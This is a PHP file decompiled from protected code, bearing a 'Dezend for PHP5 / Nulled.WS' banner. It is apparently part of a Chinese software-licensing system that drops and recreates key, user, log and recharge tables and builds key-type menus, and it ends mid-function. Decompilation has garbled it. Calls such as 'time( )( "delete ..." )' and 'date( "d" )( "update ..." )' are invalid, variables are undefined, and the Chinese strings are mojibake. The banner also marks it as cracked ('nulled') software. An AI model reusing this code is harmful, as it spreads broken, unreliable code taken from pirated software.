<?php
/*********************/
/*                   */
/*  Dezend for PHP5  */
/*         NWS       */
/*      Nulled.WS    */
/*                   */
/*********************/

function _obfuscate_j4iMi4_Tk42OjIaNkIiGkYsÿ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ = 1 )
{
    $_obfuscate_iJGPjJWLj4uLkIqVjYiHh48ÿ = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obfuscate_iY2Oh5OGlIqQhpCJi5CMkogÿ = ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Yÿ[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ] << 4 ) + ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Yÿ[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ + 1] >> 4 );
        $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ += 2;
    } while ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ÿ < 28 );
}

function _obfuscate_jIeRipOPkpCSlY_HjZOKkYoÿ( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Yÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8ÿ( "select * from kss_tb_soft" );
    foreach ( $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Yÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
    {
        time( )( "delete from `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['id']."` where `addtime`<".( time( ) - 86400 * Z_LOG_DAY ), "sync" );
    }
}

function _obfuscate_j4iOio6Jh46TiI6QkY_Hh5Uÿ( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    $_obfuscate_kZWKiYiOkouSi5OPjI6Vio0ÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAÿ( "select * from kss_tb_config where id=1" );
    if ( $_obfuscate_kZWKiYiOkouSi5OPjI6Vio0ÿ['clear_z_log'] != date( "d" ) )
    {
        date( "d" )( "update kss_tb_config set clear_z_log=".date( "d" )." where `id`=1", "notsync" );
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8ÿ( "select * from kss_tb_soft " );
    }
    return $_obfuscate_lYeKk46VlJOHkZOGjZGIko8ÿ;
}

function _obfuscate_lImPlIqVi5SQjpOHkIyHi5Qÿ( $_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ, $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ, $_obfuscate_h4mRiI2JlYmThoyOjIqQjokÿ )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ = "";
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "DROP TABLE IF EXISTS `kss_z_cz_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ é™¤æ—§çš„kss_z_cz_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."è¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "CREATE TABLE `kss_z_cz_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."` (`id` int(11) unsigned NOT NULL auto_increment,`addtime` int(10) unsigned NOT NULL,`cztype` tinyint(2) unsigned NOT NULL,`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`oldcday` decimal(9,2) unsigned NOT NULL,`newcday` decimal(9,2) unsigned NOT NULL,`oldtimes` int(10) unsigned NOT NULL,`newtimes` int(10) unsigned NOT NULL,`keys` varchar(170) character set utf8 collate utf8_bin NOT NULL default '',`tzxguser` varchar(32) character set utf8 collate utf8_bin NOT NULL default '',  PRIMARY KEY  (`id`), KEY `addtime` (`addtime`), KEY `username` (`username`(10))) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='å®¢æˆ·å¸å·æ—¶é—´å˜æ›´æ—¥å¿—' AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ›å»ºæ–°çš„kss_z_cz_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."è¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "DROP TABLE IF EXISTS `kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ é™¤æ—§çš„kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."è¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "CREATE TABLE `kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."` (`id` int(10) unsigned NOT NULL auto_increment,`managerid` smallint(5) unsigned NOT NULL,`keyfix` char(4) character set utf8 collate utf8_bin NOT NULL,`keys` char(6) character set utf8 collate utf8_bin NOT NULL,`keyspassword` char(22) character set utf8 collate utf8_bin NOT NULL,`addtime` int(10) unsigned NOT NULL,`ordernum` char(24) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) unsigned NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`tag` varchar(50) character set utf8 collate utf8_bin NOT NULL default '',`islock` tinyint(1) unsigned NOT NULL default '0',`isback` tinyint(1) unsigned NOT NULL default '0',`cztime` int(10) unsigned NOT NULL default '0',`czusername` varchar(32) NOT NULL default '',PRIMARY KEY  (`id`),UNIQUE KEY `keys` (`keys`), KEY `ordernum` (`ordernum`(10)), KEY `keyextattr` (`keyextattr`(10)), KEY `tag` (`tag`(10)), KEY `czusername` (`czusername`(10)), KEY `islock` (`islock`), KEY `isback` (`isback`), KEY `keyfix_uid_cztime` (`keyfix`,`managerid`,`cztime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ›å»ºæ–°çš„kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."è¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "DROP TABLE IF EXISTS `kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."_recycle`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ é™¤æ—§çš„kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."_recycleè¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "CREATE TABLE `kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."_recycle` (`id` int(10) unsigned NOT NULL auto_increment,`managerid` smallint(5) unsigned NOT NULL,`keyfix` char(4) character set utf8 collate utf8_bin NOT NULL,`keys` char(6) character set utf8 collate utf8_bin NOT NULL,`keyspassword` char(22) character set utf8 collate utf8_bin NOT NULL,`addtime` int(10) unsigned NOT NULL,`ordernum` char(24) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) unsigned NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`tag` varchar(50) NOT NULL default '',`islock` tinyint(1) unsigned NOT NULL default '0',`isback` tinyint(1) unsigned NOT NULL default '0',`cztime` int(10) unsigned NOT NULL default '0',`czusername` varchar(32) character set utf8 collate utf8_bin NOT NULL default '',`deltime` int(10) unsigned NOT NULL,`delmid` smallint(5) unsigned NOT NULL,PRIMARY KEY  (`id`),UNIQUE KEY `keys` (`keys`), KEY `ordernum` (`ordernum`(10)), KEY `keyextattr` (`keyextattr`(10)), KEY `tag` (`tag`(10)), KEY `czusername` (`czusername`(10)), KEY `islock` (`islock`), KEY `isback` (`isback`), KEY `deltime` (`deltime`),KEY `keyfix_uid_cztime` (`keyfix`,`managerid`,`cztime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ›å»ºæ–°çš„kss_z_key_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."_recycleè¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "DROP TABLE IF EXISTS `kss_z_log_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ é™¤æ—§çš„kss_z_log_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."è¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "CREATE TABLE `kss_z_log_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."` (`id` int(10) NOT NULL auto_increment,`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`optype` tinyint(2) unsigned NOT NULL,`clientid` smallint(5) unsigned NOT NULL,`addtime` int(10) unsigned NOT NULL,`ip` bigint(20) unsigned NOT NULL,`pccode` varchar(512) character set utf8 NOT NULL default '',`linecode` varchar(10) character set utf8 NOT NULL default '',`opccode` varchar(512) character set utf8 NOT NULL, `oip` bigint(20) unsigned NOT NULL default '0',PRIMARY KEY  (`id`),KEY `addtime` (`addtime`),KEY `keys` (`username`(10),`optype`,`clientid`)) ENGINE=MyISAM DEFAULT CHARSET=ascii AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ›å»ºæ–°çš„kss_z_log_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."è¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "DROP TABLE IF EXISTS `kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ é™¤æ—§çš„kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."è¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "CREATE TABLE `kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."` (`id` int(10) unsigned NOT NULL auto_increment,`istempuser` tinyint(1) unsigned NOT NULL default '0',`managerid` smallint(5) unsigned NOT NULL default '0',`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password2` varchar(32) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`islock` int(1) unsigned NOT NULL default '0',`ispause` int(1) unsigned NOT NULL default '0',`pausetime` int(10) unsigned NOT NULL default '0',`hstats` int(10) unsigned NOT NULL default '0',`unlineday` int(10) unsigned NOT NULL default '0',`unlinetimes` int(10) unsigned NOT NULL default '0',`tag` varchar(100) character set utf8 collate utf8_bin NOT NULL default '-',`bdinfo` varchar(100) NOT NULL default '',`linecode` varchar(10) NOT NULL default '',`pccode` varchar(512) NOT NULL default '',`addtime` int(10) unsigned NOT NULL default '0',`starttime` int(10) unsigned NOT NULL default '0',`endtime` int(10) unsigned NOT NULL default '0',`lasttime` int(10) unsigned NOT NULL default '0',`isonline` tinyint(1) unsigned NOT NULL default '0',`lastip` bigint(20) unsigned NOT NULL default '0',`activetimes` int(10) unsigned NOT NULL default '0',`unlocktimes` int(10) unsigned NOT NULL default '0',`unlockday` tinyint(2) unsigned NOT NULL default '0',`cztimes` int(10) unsigned NOT NULL default '0',`isusetestkey` tinyint(1) unsigned NOT NULL default '0',`parentuser` varchar(100) NOT NULL default '',`intro` varchar(50) NOT NULL default '',`updata` varchar(128) NOT NULL default '',PRIMARY KEY  (`id`),KEY `username` (`username`(10)),KEY `managerid` (`managerid`),KEY `tag` (`tag`),KEY `keyextattr` (`keyextattr`),KEY `lasttime` (`lasttime`,`isonline`),KEY `islock` (`islock`),KEY `endtime` (`endtime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ›å»ºæ–°çš„kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."è¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "DROP TABLE IF EXISTS `kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."_recycle`", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ é™¤æ—§çš„kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."_recycleè¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYÿ( "CREATE TABLE `kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."_recycle` (`id` int(10) unsigned NOT NULL auto_increment,`istempuser` tinyint(1) unsigned NOT NULL default '0',`managerid` smallint(5) unsigned NOT NULL default '0',`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password2` varchar(32) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`islock` int(1) unsigned NOT NULL default '0',`ispause` int(1) unsigned NOT NULL default '0',`pausetime` int(10) unsigned NOT NULL default '0',`hstats` int(10) unsigned NOT NULL default '0',`unlineday` int(10) unsigned NOT NULL default '0',`unlinetimes` int(10) unsigned NOT NULL default '0',`tag` varchar(100) character set utf8 collate utf8_bin NOT NULL default '-',`bdinfo` varchar(100) NOT NULL default '',`linecode` varchar(10) NOT NULL default '',`pccode` varchar(512) NOT NULL default '',`addtime` int(10) unsigned NOT NULL default '0',`starttime` int(10) unsigned NOT NULL default '0',`endtime` int(10) unsigned NOT NULL default '0',`lasttime` int(10) unsigned NOT NULL default '0',`isonline` tinyint(1) unsigned NOT NULL default '0',`lastip` bigint(20) unsigned NOT NULL default '0',`activetimes` int(10) unsigned NOT NULL default '0',`unlocktimes` int(10) unsigned NOT NULL default '0',`unlockday` tinyint(2) unsigned NOT NULL default '0',`cztimes` int(10) unsigned NOT NULL default '0',`isusetestkey` tinyint(1) unsigned NOT NULL default '0',`parentuser` varchar(100) NOT NULL default '',`intro` varchar(50) NOT NULL default '',`updata` varchar(128) NOT NULL default '',`delmid` smallint(5) unsigned NOT NULL default '0',`deltime` int(10) unsigned NOT NULL default '0',PRIMARY KEY  (`id`),KEY `username` (`username`(10)),KEY `managerid` (`managerid`),KEY `tag` (`tag`),KEY `keyextattr` (`keyextattr`),KEY `lasttime` (`lasttime`,`isonline`),KEY `islock` (`islock`),KEY `endtime` (`endtime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYÿ === FALSE )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ .= "åˆ›å»ºæ–°çš„kss_z_user_".$_obfuscate_koeLiIiJjJOQlIaJi4aUh5Aÿ."_".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ."_recycleè¡¨å‡ºé”™".$_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ->_obfuscate_iYmHkJSKj5OJhoiRiY2Rio4ÿ( )."<br>";
    }
    if ( $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ == "" )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ = TRUE;
    }
    return $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkÿ;
}

function _obfuscate_lIuHjouPkIaTk46Ih5SVjIwÿ( $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ, &$_obfuscate_i4eIkYmJiIyQk4iMj4iGh4oÿ )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    global $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ;
    $_obfuscate_lYuNj46JkoyKjY_IjIiLj4Yÿ = "0000";
    if ( $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ == 0 )
    {
        return "<option value='".$_obfuscate_lYuNj46JkoyKjY_IjIiLj4Yÿ."'>----æš‚æ— å¡ç±»----</option>";
    }
    $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40ÿ = $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pid']( "select * from `kss_tb_keyset` where `pid`=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pid']." and `softid`=".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ." and `islock`=0 order by `cday` asc" );
    if ( empty( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40ÿ ) )
    {
        return "<option value='".$_obfuscate_lYuNj46JkoyKjY_IjIiLj4Yÿ."'>----æš‚æ— å¡ç±»----</option>";
    }
    $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ = "";
    foreach ( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40ÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
    {
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "<option value='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['prefix']."'";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " cday='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['cday']."'";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " points='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['points']."'";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " linknum='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['linknum']."'";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "  extattr1='".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1']."'>";
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['keyname']."--[å¤©".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['cday'], 2 )." ç‚¹".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['points']." é€šé“".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['linknum'];
        if ( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1'] != "" )
        {
            $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= " é™„å±æ€§".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1'];
            $_obfuscate_i4eIkYmJiIyQk4iMj4iGh4oÿ[$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['prefix']] = $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['keyname']."--[å¤©".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['cday'], 2 )." ç‚¹".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['points']." é€šé“".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['linknum']." é™„å±æ€§".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['extattr1'];
        }
        else
        {
            $_obfuscate_i4eIkYmJiIyQk4iMj4iGh4oÿ[$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['prefix']] = $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['keyname']."--[å¤©".round( $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['cday'], 2 )." ç‚¹".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['points']." é€šé“".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ['linknum'];
        }
        $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ .= "]</option>";
    }
    return $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ;
}

function _obfuscate_lIeLiY6Gk4aNiY2Si4uJiIsÿ( $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ, $_obfuscate_hoyPk5CJiZKVj4iLh5SHkJAÿ = 0, $_obfuscate_iYiMh4aGkJCJk4qHjIiVi4Yÿ = 0, $_obfuscate_kIiVkYqGk4aTjoyIiJGGlYoÿ = FALSE )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocÿ;
    global $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ;
    $_obfuscate_lYuNj46JkoyKjY_IjIiLj4Yÿ = 0;
    if ( $_obfuscate_iYiMh4aGkJCJk4qHjIiVi4Yÿ == 2 )
    {
        $_obfuscate_lYuNj46JkoyKjY_IjIiLj4Yÿ = "";
    }
    if ( $_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ == 0 )
    {
        return "<option value='".$_obfuscate_lYuNj46JkoyKjY_IjIiLj4Yÿ."'>----æš‚æ— å¡ç±»----</option>";
    }
    $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40ÿ = $_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pid']( "select * from `kss_tb_keyset` where `pid`=".$_obfuscate_lI6OiJSPjZWVi5GQhoiPjpUÿ['pid']." and `softid`=".$_obfuscate_jpKNh4aRh4aQkY2PlIuRhpEÿ." and `islock`=0 order by `cday` asc" );
    if ( empty( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40ÿ ) )
    {
        return "<option value='".$_obfuscate_lYuNj46JkoyKjY_IjIiLj4Yÿ."'>----æš‚æ— å¡ç±»----</option>";
    }
    $_obfuscate_j42Hk5GMkZSNj42RipORkI4ÿ = "";
    if ( empty( $_obfuscate_kIiVkYqGk4aTjoyIiJGGlYoÿ ) )
    {
        $_obfuscate_i4yIjo2QjpCViIqOiYiGkZEÿ = array( );
        foreach ( $_obfuscate_kIiVkYqGk4aTjoyIiJGGlYoÿ as $_obfuscate_i4yKj4eSi4mRkIqSkY6Piokÿ )
        {
            $_obfuscate_i4yIjo2QjpCViIqOiYiGkZEÿ[$_obfuscate_i4yKj4eSi4mRkIqSkY6Piokÿ['keygroupid']] = $_obfuscate_i4yKj4eSi4mRkIqSkY6Piokÿ['keyprice'];
        }
        foreach ( $_obfuscate_iYeIjIaVlYaIj4yTiJWHk40ÿ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIÿ )
        {
